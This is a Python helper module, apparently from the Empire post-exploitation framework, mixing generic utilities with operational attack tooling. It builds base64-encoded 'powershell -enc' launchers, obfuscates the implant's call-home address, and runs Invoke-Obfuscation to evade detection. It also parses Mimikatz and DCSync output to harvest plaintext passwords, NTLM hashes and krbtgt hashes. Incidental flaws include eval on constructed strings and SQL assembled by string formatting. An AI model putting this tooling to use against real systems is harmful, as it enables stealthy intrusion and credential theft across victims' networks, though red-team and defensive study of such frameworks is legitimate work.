"""

Misc. helper functions used in Empire.

Includes:

    validate_ip() - uses iptools to validate an IP
    validate_ntlm() - checks if the passed string is an NTLM hash
    generate_ip_list() - generates an IP range list from a variety of inputs
    random_string() - returns a random string of the specified number of characters
    randomize_capitalization() - randomizes the capitalization of a string
    chunks() - used to split a string into chunks
    strip_python_comments() - strips Python newlines and comments
    enc_powershell() - encodes a PowerShell command into a form usable by powershell.exe -enc ...
    powershell_launcher() - builds a command line powershell.exe launcher
    parse_powershell_script() - parses a raw PowerShell file and return the function names
    strip_powershell_comments() - strips PowerShell newlines and comments
    get_powerview_psreflect_overhead() - extracts some of the psreflect overhead for PowerView
    get_dependent_functions() - extracts function dependenies from a PowerShell script
    find_all_dependent_functions() - takes a PowerShell script and a set of functions, and returns all dependencies
    generate_dynamic_powershell_script() - takes a PowerShell script and set of functions and returns a minimized script
    parse_credentials() - enumerate module output, looking for any parseable credential sections
    parse_mimikatz() - parses the output of Invoke-Mimikatz
    get_config() - pulls config information from the database output of normal menu execution
    get_listener_options() - gets listener options outside of normal menu execution
    get_datetime() - returns the current date time in a standard format
    get_file_datetime() - returns the current date time in a format savable to a file
    get_file_size() - returns a string representing file size
    lhost() - returns the local IP
    color() - used for colorizing output in the Linux terminal
    unique() - uniquifies a list, order preserving
    uniquify_tuples() - uniquifies Mimikatz tuples based on the password
    decode_base64() - tries to base64 decode a string
    encode_base64() - tries to base64 encode a string
    complete_path() - helper to tab-complete file paths
    dict_factory() - helper that returns the SQLite query results as a dictionary
    KThread() - a subclass of threading.Thread, with a kill() method
    slackMessage() - send notifications to the Slack API
    generate_random_script_var_name() - use in scripts to generate random variable names
"""
from __future__ import division
from __future__ import print_function

from future import standard_library

standard_library.install_aliases()
from builtins import str
from builtins import range
from past.utils import old_div
import re
import string
import base64
import binascii
import sys
import os
import socket
import sqlite3
import iptools
import threading
import pickle
import netifaces
import random

import subprocess
import fnmatch
import urllib.request, urllib.parse, urllib.error, urllib.request, urllib.error, urllib.parse
import hashlib
import datetime
import uuid
import ipaddress
import simplejson as json

from datetime import datetime

###############################################################
#
# Global Variables
#
################################################################

globentropy = random.randint(1, datetime.today().day)
globDebug = False


###############################################################
#
# Validation methods
#
###############################################################

def validate_ip(IP):
    """
    Uses iptools to validate an IP.
    """
    try:
        validate_IPv4 = iptools.ipv4.validate_ip(IP)
        validate_IPv6 = iptools.ipv6.validate_ip(IP)

        if validate_IPv4 is True:
            return validate_IPv4
        elif validate_IPv6 is True:
            return validate_IPv6
    except Exception as e:
        return e


def validate_ntlm(data):
    """
    Checks if the passed string is an NTLM hash.
    """
    allowed = re.compile("^[0-9a-f]{32}", re.IGNORECASE)
    if allowed.match(data):
        return True
    else:
        return False


def generate_ip_list(s):
    """
    Takes a comma separated list of IP/range/CIDR addresses and
    generates an IP range list.
    """

    # strip newlines and make everything comma separated
    s = ",".join(s.splitlines())
    # strip out spaces
    s = ",".join(s.split(" "))

    ranges = ""
    if s and s != "":
        parts = s.split(",")

        for part in parts:
            p = part.split("-")
            if len(p) == 2:
                if iptools.ipv4.validate_ip(p[0]) and iptools.ipv4.validate_ip(p[1]):
                    ranges += "('" + str(p[0]) + "', '" + str(p[1]) + "'),"
            else:
                if "/" in part and iptools.ipv4.validate_cidr(part):
                    ranges += "'" + str(p[0]) + "',"
                elif iptools.ipv4.validate_ip(part):
                    ranges += "'" + str(p[0]) + "',"

        if ranges != "":
            return eval("iptools.IpRangeList(" + ranges + ")")
        else:
            return None

    else:
        return None


####################################################################################
#
# Randomizers/obfuscators
#
####################################################################################
def random_string(length=-1, charset=string.ascii_letters):
    """
    Returns a random string of "length" characters.
    If no length is specified, resulting string is in between 6 and 15 characters.
    A character set can be specified, defaulting to just alpha letters.
    """
    if length == -1: length = random.randrange(6, 16)
    random_string = ''.join(random.choice(charset) for x in range(length))
    return random_string


def generate_random_script_var_name(origvariname, globDebug=False):
    if globDebug:
        return origvariname
    else:
        origvariname = origvariname.encode('UTF-8')
        entrop = bytes(globentropy)
        hash_object = hashlib.sha1(origvariname + entrop).hexdigest()
        return hash_object[:(3 + (globentropy % 3))]


def randomize_capitalization(data):
    """
    Randomize the capitalization of a string.
    """
    return "".join(random.choice([k.upper(), k]) for k in data)


def obfuscate_call_home_address(data):
    """
    Poowershell script to base64 encode variable contents and execute on command as if clear text in powershell
    """
    tmp = '$(' + randomize_capitalization(
        '[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(\'')
    tmp += (enc_powershell(data)).decode('UTF-8') + '\')))'
    return tmp

def chunks(l, n):
    """
    Generator to split a string l into chunks of size n.
    Used by macro modules.
    """
    for i in range(0, len(l), n):
        yield l[i:i + n]


####################################################################################
#
# Python-specific helpers
#
####################################################################################

def strip_python_comments(data):
    """
    *** DECEMBER 2017 - DEPRECATED, PLEASE DO NOT USE ***

    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a Python source file.
    """
    print(color("[!] strip_python_comments is deprecated and should not be used"))
    lines = data.split("\n")
    strippedLines = [line for line in lines if ((not line.strip().startswith("#")) and (line.strip() != ''))]
    return "\n".join(strippedLines)


####################################################################################
#
# PowerShell-specific helpers
#
####################################################################################

def enc_powershell(raw):
    """
    Encode a PowerShell command into a form usable by powershell.exe -enc ...
    """
    tmp = base64.b64encode(raw.encode('UTF-16LE'))
    #tmp = raw
    #tmp = bytes("".join([str(char) + "\x00" for char in raw]), "UTF-16LE")
    #tmp = base64.b64encode(tmp)
    return tmp


def powershell_launcher(raw, modifiable_launcher):
    """
    Build a one line PowerShell launcher with an -enc command.
    """
    # encode the data into a form usable by -enc
    encCMD = enc_powershell(raw)

    return modifiable_launcher + " " + encCMD.decode('UTF-8')


def parse_powershell_script(data):
    """
    Parse a raw PowerShell file and return the function names.
    """
    p = re.compile("function(.*){")
    return [x.strip() for x in p.findall(data)]


def strip_powershell_comments(data):
    """
    Strip block comments, line comments, empty lines, verbose statements,
    and debug statements from a PowerShell source file.
    """

    # strip block comments
    strippedCode = re.sub(re.compile('<#.*?#>', re.DOTALL), '\n', data)

    # strip blank lines, lines starting with #, and verbose/debug statements
    strippedCode = "\n".join([line for line in strippedCode.split('\n') if (
                (line.strip() != '') and (not line.strip().startswith("#")) and (
            not line.strip().lower().startswith("write-verbose ")) and (
                    not line.strip().lower().startswith("write-debug ")))])

    return strippedCode


####################################################################################
#
# PowerView dynamic generation helpers
#
####################################################################################

def get_powerview_psreflect_overhead(script):
    """
    Helper to extract some of the psreflect overhead for PowerView/PowerUp.
    """

    if 'PowerUp' in script[0:100]:
        pattern = re.compile(r'\n\$Module =.*\[\'kernel32\'\]', re.DOTALL)
    else:
        # otherwise extracting from PowerView
        pattern = re.compile(r'\n\$Mod =.*\[\'wtsapi32\'\]', re.DOTALL)

    try:
        return strip_powershell_comments(pattern.findall(script)[0])
    except:
        print(color("[!] Error extracting psreflect overhead from script!"))
        return ""


def get_dependent_functions(code, functionNames):
    """
    Helper that takes a chunk of PowerShell code and a set of function
    names and returns the unique set of function names within the script block.
    """

    dependentFunctions = set()
    for functionName in functionNames:
        # find all function names that aren't followed by another alpha character
        if re.search("[^A-Za-z']+" + functionName + "[^A-Za-z']+", code, re.IGNORECASE):
            # if "'AbuseFunction' \"%s" % (functionName) not in code:
            # TODO: fix superflous functions from being added to PowerUp Invoke-AllChecks code...
            dependentFunctions.add(functionName)

    if re.search("\$Netapi32|\$Advapi32|\$Kernel32|\$Wtsapi32", code, re.IGNORECASE):
        dependentFunctions |= set(["New-InMemoryModule", "func", "Add-Win32Type", "psenum", "struct"])

    return dependentFunctions


def find_all_dependent_functions(functions, functionsToProcess, resultFunctions=[]):
    """
    Takes a dictionary of "[functionName] -> functionCode" and a set of functions
    to process, and recursively returns all nested functions that may be required.

    Used to map the dependent functions for nested script dependencies like in
    PowerView.
    """

    if isinstance(functionsToProcess, str):
        functionsToProcess = [functionsToProcess]

    while len(functionsToProcess) != 0:

        # pop the next function to process off the stack
        requiredFunction = functionsToProcess.pop()

        if requiredFunction not in resultFunctions:
            resultFunctions.append(requiredFunction)

        # get the dependencies for the function we're currently processing
        try:
            functionDependencies = get_dependent_functions(functions[requiredFunction], list(functions.keys()))
        except:
            functionDependencies = []
            print(color("[!] Error in retrieving dependencies for function %s !" % (requiredFunction)))

        for functionDependency in functionDependencies:
            if functionDependency not in resultFunctions and functionDependency not in functionsToProcess:
                # for each function dependency, if we haven't already seen it
                #   add it to the stack for processing
                functionsToProcess.append(functionDependency)
                resultFunctions.append(functionDependency)

        resultFunctions = find_all_dependent_functions(functions, functionsToProcess, resultFunctions)

    return resultFunctions


def generate_dynamic_powershell_script(script, functionNames):
    """
    Takes a PowerShell script and a function name (or array of function names,
    generates a dictionary of "[functionNames] -> functionCode", and recursively
    maps all dependent functions for the specified function name.

    A script is returned with only the code necessary for the given
    functionName, stripped of comments and whitespace.

    Note: for PowerView, it will also dynamically detect if psreflect
    overhead is needed and add it to the result script.
    """

    newScript = ""
    psreflect_functions = ["New-InMemoryModule", "func", "Add-Win32Type", "psenum", "struct"]

    if type(functionNames) is not list:
        functionNames = [functionNames]

    # build a mapping of functionNames -> stripped function code
    functions = {}
    pattern = re.compile(r'\n(?:function|filter).*?{.*?\n}\n', re.DOTALL)

    for match in pattern.findall(script):
        name = match[:40].split()[1]
        functions[name] = strip_powershell_comments(match)

    # recursively enumerate all possible function dependencies and
    #   start building the new result script
    functionDependencies = []

    for functionName in functionNames:
        functionDependencies += find_all_dependent_functions(functions, functionName, [])
        functionDependencies = unique(functionDependencies)

    for functionDependency in functionDependencies:
        try:
            newScript += functions[functionDependency] + "\n"
        except:
            print(color("[!] Key error with function %s !" % (functionDependency)))

    # if any psreflect methods are needed, add in the overhead at the end
    if any(el in set(psreflect_functions) for el in functionDependencies):
        newScript += get_powerview_psreflect_overhead(script)

    return newScript + "\n"


###############################################################
#
# Parsers
#
###############################################################

def parse_credentials(data):
    """
    Enumerate module output, looking for any parseable credential sections.
    """

    parts = data.split("\n")

    # tag for Invoke-Mimikatz output
    if parts[0].startswith("Hostname:"):
        return parse_mimikatz(data)

    # powershell/collection/prompt output
    elif parts[0].startswith("[+] Prompted credentials:"):

        parts = parts[0].split("->")
        if len(parts) == 2:

            username = parts[1].split(":", 1)[0].strip()
            password = parts[1].split(":", 1)[1].strip()

            if "\\" in username:
                domain = username.split("\\")[0].strip()
                username = username.split("\\")[1].strip()
            else:
                domain = ""

            return [("plaintext", domain, username, password, "", "")]

        else:
            print(color("[!] Error in parsing prompted credential output."))
            return None

    # python/collection/prompt (Mac OS)
    elif "text returned:" in parts[0]:
        parts2 = parts[0].split("text returned:")
        if len(parts2) >= 2:
            password = parts2[-1]
            return [("plaintext", "", "", password, "", "")]

    else:
        return None


def parse_mimikatz(data):
    """
    Parse the output from Invoke-Mimikatz to return credential sets.
    """

    # cred format:
    #   credType, domain, username, password, hostname, sid
    creds = []

    # regexes for "sekurlsa::logonpasswords" Mimikatz output
    regexes = ["(?s)(?<=msv :).*?(?=tspkg :)", "(?s)(?<=tspkg :).*?(?=wdigest :)",
               "(?s)(?<=wdigest :).*?(?=kerberos :)", "(?s)(?<=kerberos :).*?(?=ssp :)",
               "(?s)(?<=ssp :).*?(?=credman :)", "(?s)(?<=credman :).*?(?=Authentication Id :)",
               "(?s)(?<=credman :).*?(?=mimikatz)"]

    hostDomain = ""
    domainSid = ""
    hostName = ""

    lines = data.split(b"\n")
    for line in lines[0:2]:
        if line.startswith(b"Hostname:"):
            try:
                domain = line.split(b":")[1].strip()
                temp = domain.split(b"/")[0].strip()
                domainSid = domain.split(b"/")[1].strip()

                hostName = temp.split(b".")[0]
                hostDomain = b".".join(temp.split(".")[1:])
            except:
                pass

    for regex in regexes:

        p = re.compile(regex)
        for match in p.findall(data.decode("UTF-8")):

            lines2 = match.split("\n")
            username, domain, password = "", "", ""

            for line in lines2:
                try:
                    if "Username" in line:
                        username = line.split(":", 1)[1].strip()
                    elif "Domain" in line:
                        domain = line.split(":", 1)[1].strip()
                    elif "NTLM" in line or "Password" in line:
                        password = line.split(":", 1)[1].strip()
                except:
                    pass

            if username != "" and password != "" and password != "(null)":

                sid = ""

                # substitute the FQDN in if it matches
                if hostDomain.startswith(domain.lower()):
                    domain = hostDomain
                    sid = domainSid

                if validate_ntlm(password):
                    credType = "hash"

                else:
                    credType = "plaintext"

                # ignore machine account plaintexts
                if not (credType == "plaintext" and username.endswith("$")):
                    creds.append((credType, domain, username, password, hostName, sid))

    if len(creds) == 0:
        # check if we have lsadump output to check for krbtgt
        #   happens on domain controller hashdumps
        for x in range(8, 13):
            print(lines)
            if lines[x].startswith(b"Domain :"):

                domain, sid, krbtgtHash = "", "", ""

                try:
                    domainParts = lines[x].split(":")[1]
                    domain = domainParts.split("/")[0].strip()
                    sid = domainParts.split("/")[1].strip()

                    # substitute the FQDN in if it matches
                    if hostDomain.startswith(domain.lower()):
                        domain = hostDomain
                        sid = domainSid

                    for x in range(0, len(lines)):
                        if lines[x].startswith("User : krbtgt"):
                            krbtgtHash = lines[x + 2].split(":")[1].strip()
                            break

                    if krbtgtHash != "":
                        creds.append(("hash", domain, "krbtgt", krbtgtHash, hostName, sid))
                except Exception as e:
                    pass

    if len(creds) == 0:
        # check if we get lsadump::dcsync output
        if b'** SAM ACCOUNT **' in lines:
            domain, user, userHash, dcName, sid = "", "", "", "", ""
            for line in lines:
                try:
                    if line.strip().endswith("will be the domain"):
                        domain = line.split("'")[1]
                    elif line.strip().endswith("will be the DC server"):
                        dcName = line.split("'")[1].split(".")[0]
                    elif line.strip().startswith("SAM Username"):
                        user = line.split(":")[1].strip()
                    elif line.strip().startswith("Object Security ID"):
                        parts = line.split(":")[1].strip().split("-")
                        sid = "-".join(parts[0:-1])
                    elif line.strip().startswith("Hash NTLM:"):
                        userHash = line.split(":")[1].strip()
                except:
                    pass

            if domain != "" and userHash != "":
                creds.append(("hash", domain, user, userHash, dcName, sid))

    return uniquify_tuples(creds)


###############################################################
#
# Miscellaneous methods (formatting, sorting, etc.)
#
###############################################################

def get_config(fields):
    """
    Helper to pull common database config information outside of the
    normal menu execution.

    Fields should be comma separated.
        i.e. 'version,install_path'
    """

    conn = sqlite3.connect('./data/empire.db', check_same_thread=False)
    conn.isolation_level = None

    cur = conn.cursor()

    # Check if there is a new field not in the database
    columns = [i[1] for i in cur.execute('PRAGMA table_info(config)')]
    for field in fields.split(','):
        if field.strip() not in columns:
            cur.execute("ALTER TABLE config ADD COLUMN %s BLOB" % (field))

    cur.execute("SELECT %s FROM config" % (fields))
    results = cur.fetchone()
    cur.close()
    conn.close()

    return results


def get_listener_options(listenerName):
    """
    Returns the options for a specified listenername from the database outside
    of the normal menu execution.
    """
    try:
        conn = sqlite3.connect('./data/empire.db', check_same_thread=False)
        conn.isolation_level = None
        conn.row_factory = dict_factory
        cur = conn.cursor()
        cur.execute("SELECT options FROM listeners WHERE name = ?", [listenerName])
        result = cur.fetchone()
        cur.close()
        conn.close()
        return pickle.loads(result['options'])
    except Exception:
        return None


def get_datetime():
    """
    Return the current date/time
    """
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def utc_to_local(utc):
    """
    Converts a datetime object in UTC to local time
    """

    offset = datetime.now() - datetime.utcnow()
    return (utc + offset).strftime("%Y-%m-%d %H:%M:%S")


def get_file_datetime():
    """
    Return the current date/time in a format workable for a file name.
    """
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")


def get_file_size(file):
    """
    Returns a string with the file size and highest rating.
    """
    byte_size = sys.getsizeof(file)
    kb_size = old_div(byte_size, 1024)
    if kb_size == 0:
        byte_size = "%s Bytes" % (byte_size)
        return byte_size
    mb_size = old_div(kb_size, 1024)
    if mb_size == 0:
        kb_size = "%s KB" % (kb_size)
        return kb_size
    gb_size = old_div(mb_size, 1024) % (mb_size)
    if gb_size == 0:
        mb_size = "%s MB" % (mb_size)
        return mb_size
    return "%s GB" % (gb_size)


def lhost():
    """
    Return the local IP.
    """

    if os.name != 'nt':
        import fcntl
        import struct

        def get_interface_ip(ifname):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return socket.inet_ntoa(fcntl.ioctl(
                    s.fileno(),
                    0x8915,  # SIOCGIFADDR
                    struct.pack('256s', ifname[:15].encode("UTF-8"))
                )[20:24])
            except IOError as e:
                return ""

    ip = ''
    try:
        ip = socket.gethostbyname(socket.gethostname())
    except socket.gaierror:
        pass
    except:
        print("Unexpected error:", sys.exc_info()[0])
        return ip

    if (ip == '' or ip.startswith('127.')) and os.name != 'nt':
        interfaces = netifaces.interfaces()
        for ifname in interfaces:
            if "lo" not in ifname:
                try:
                    ip = get_interface_ip(ifname)
                    if ip != "":
                        break
                except:
                    print('Unexpected error:', sys.exc_info()[0])
                    pass
    return ip


def color(string, color=None):
    """
    Change text color for the Linux terminal.
    """

    attr = []
    # bold
    attr.append('1')

    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "yellow":
            attr.append('33')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string


def lastseen(stamp, delay, jitter):
    """
    Colorize the Last Seen field based on measured delays
    """
    try:
        delta = datetime.now() - datetime.strptime(stamp, "%Y-%m-%d %H:%M:%S")
        if delta.seconds > delay * (jitter + 1) * 5:
            return color(stamp, "red")
        elif delta.seconds > delay * (jitter + 1):
            return color(stamp, "yellow")
        else:
            return color(stamp, "green")
    except Exception:
        return stamp


def unique(seq, idfun=None):
    """
    Uniquifies a list, order preserving.

    from http://www.peterbe.com/plog/uniqifiers-benchmark
    """
    if idfun is None:
        def idfun(x): return x
    seen = {}
    result = []
    for item in seq:
        marker = idfun(item)
        # in old Python versions:
        # if seen.has_key(marker)
        # but in new ones:
        if marker in seen: continue
        seen[marker] = 1
        result.append(item)
    return result


def uniquify_tuples(tuples):
    """
    Uniquifies Mimikatz tuples based on the password.

    cred format- (credType, domain, username, password, hostname, sid)
    """
    seen = set()
    return [item for item in tuples if "%s%s%s%s" % (item[0], item[1], item[2], item[3]) not in seen and not seen.add(
        "%s%s%s%s" % (item[0], item[1], item[2], item[3]))]


def decode_base64(data):
    """
    Try to decode a base64 string.
    From http://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding
    """
    missing_padding = 4 - len(data) % 4
    if missing_padding:
        data += b'=' * missing_padding

    try:
        result = base64.decodestring(data)
        return result
    except binascii.Error:
        # if there's a decoding error, just return the data
        return data


def encode_base64(data):
    """
    Decode data as a base64 string.
    """
    return base64.encodestring(data).strip()


def complete_path(text, line, arg=False):
    """
    Helper for tab-completion of file paths.
    """

    # stolen from dataq at
    #   http://stackoverflow.com/questions/16826172/filename-tab-completion-in-cmd-cmd-of-python

    if arg:
        # if we have "command something path"
        argData = line.split()[1:]
    else:
        # if we have "command path"
        argData = line.split()[0:]

    if not argData or len(argData) == 1:
        completions = os.listdir('./')
    else:
        dir, part, base = argData[-1].rpartition('/')
        if part == '':
            dir = './'
        elif dir == '':
            dir = '/'

        completions = []
        for f in os.listdir(dir):
            if f.startswith(base):
                if os.path.isfile(os.path.join(dir, f)):
                    completions.append(f)
                else:
                    completions.append(f + '/')

    return completions


def dict_factory(cursor, row):
    """
    Helper that returns the SQLite query results as a dictionary.

    From Colin Burnett: http://stackoverflow.com/questions/811548/sqlite-and-python-return-a-dictionary-using-fetchone
    """
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


def get_module_source_files():
    """
    Get the filepaths of PowerShell module_source files located
    in the data/module_source directory.
    """
    paths = []
    pattern = '*.ps1'
    for root, dirs, files in os.walk('data/module_source'):
        for filename in fnmatch.filter(files, pattern):
            paths.append(os.path.join(root, filename))
    return paths


def obfuscate(installPath, psScript, obfuscationCommand):
    """
    Obfuscate PowerShell scripts using Invoke-Obfuscation
    """
    if not is_powershell_installed():
        print(color("[!] PowerShell is not installed and is required to use obfuscation, please install it first."))
        return ""
    # When obfuscating large scripts, command line length is too long. Need to save to temp file
    toObfuscateFilename = installPath + "data/misc/ToObfuscate.ps1"
    obfuscatedFilename = installPath + "data/misc/Obfuscated.ps1"
    toObfuscateFile = open(toObfuscateFilename, 'w')
    toObfuscateFile.write(psScript)
    toObfuscateFile.close()
    # Obfuscate using Invoke-Obfuscation w/ PowerShell
    subprocess.call(
        "%s -C '$ErrorActionPreference = \"SilentlyContinue\";Invoke-Obfuscation -ScriptPath %s -Command \"%s\" -Quiet | Out-File -Encoding ASCII %s'" % (
        get_powershell_name(), toObfuscateFilename, convert_obfuscation_command(obfuscationCommand),
        obfuscatedFilename), shell=True)
    obfuscatedFile = open(obfuscatedFilename, 'r')
    # Obfuscation writes a newline character to the end of the file, ignoring that character
    psScript = obfuscatedFile.read()[0:-1]
    obfuscatedFile.close()

    return psScript


def obfuscate_module(moduleSource, obfuscationCommand="", forceReobfuscation=False):
    if is_obfuscated(moduleSource) and not forceReobfuscation:
        return

    try:
        f = open(moduleSource, 'r')
    except:
        print(color("[!] Could not read module source path at: " + moduleSource))
        return ""

    moduleCode = f.read()
    f.close()

    # obfuscate and write to obfuscated source path
    path = os.path.abspath('empire.py').split('empire.py')[0] + "/"
    obfuscatedCode = obfuscate(path, moduleCode, obfuscationCommand)
    obfuscatedSource = moduleSource.replace("module_source", "obfuscated_module_source")
    try:
        f = open(obfuscatedSource, 'w')
    except:
        print(color("[!] Could not read obfuscated module source path at: " + obfuscatedSource))
        return ""
    f.write(obfuscatedCode)
    f.close()


def is_obfuscated(moduleSource):
    obfuscatedSource = moduleSource.replace("module_source", "obfuscated_module_source")
    return os.path.isfile(obfuscatedSource)


def is_powershell_installed():
    return (get_powershell_name() != "")


def get_powershell_name():
    try:
        powershell_location = subprocess.check_output("which powershell", shell=True)
    except subprocess.CalledProcessError as e:
        try:
            powershell_location = subprocess.check_output("which pwsh", shell=True)
        except subprocess.CalledProcessError as e:
            return ""
        return "pwsh"
    return "powershell"


def convert_obfuscation_command(obfuscate_command):
    return "".join(obfuscate_command.split()).replace(",", ",home,").replace("\\", ",")


class KThread(threading.Thread):
    """
    A subclass of threading.Thread, with a kill() method.
    From https://web.archive.org/web/20130503082442/http://mail.python.org/pipermail/python-list/2004-May/281943.html
    """

    def __init__(self, *args, **keywords):
        threading.Thread.__init__(self, *args, **keywords)
        self.killed = False

    def start(self):
        """Start the thread."""
        self.__run_backup = self.run
        self.run = self.__run  # Force the Thread toinstall our trace.
        threading.Thread.start(self)

    def __run(self):
        """Hacked run function, which installs the trace."""
        sys.settrace(self.globaltrace)
        self.__run_backup()
        self.run = self.__run_backup

    def globaltrace(self, frame, why, arg):
        if why == 'call':
            return self.localtrace
        else:
            return None

    def localtrace(self, frame, why, arg):
        if self.killed:
            if why == 'line':
                raise SystemExit()
        return self.localtrace

    def kill(self):
        self.killed = True


def slackMessage(slackToken, slackChannel, slackText):
    url = "https://slack.com/api/chat.postMessage"
    data = urllib.parse.urlencode({'token': slackToken, 'channel': slackChannel, 'text': slackText})
    req = urllib.request.Request(url, data)
    resp = urllib.request.urlopen(req)
